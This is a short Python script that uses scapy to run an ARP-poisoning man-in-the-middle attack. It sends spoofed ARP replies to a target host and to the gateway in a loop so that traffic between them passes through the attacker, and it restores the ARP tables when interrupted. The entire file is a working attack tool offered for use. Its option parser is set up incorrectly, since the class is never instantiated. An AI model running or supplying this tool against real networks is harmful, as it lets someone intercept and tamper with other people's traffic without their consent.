import scapy.all as scapy
import time
import optparse

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def arp_poisoning(target_ip, poisoned_ip):

    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)
    # scapy.ls(scapy.ARP())

def reset_operation(fooled_ip, gateway_ip):

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False)

def get_user_input():
    parse_object = optparse.OptionParser
    parse_object.add_option("-t","--target",dest="target_ip",help="Enter target IP")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")
    options = parse_object.parse_args()[0]
    if not options.target_ip:
        print("Enter target IP")
    if not options.gateway_ip:
        print("Enter gateway IP")
    return options
# scan_my_network("192.168.1.38")
#get_mac_address("192.168.1.38")
number = 0
user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    while True:
        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)
        number += 2
        print("\rSending packets" + str(number),end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\n Quit & Reset")
    reset_operation(user_target_ip,user_gateway_ip)
    reset_operation(user_gateway_ip,user_target_ip)
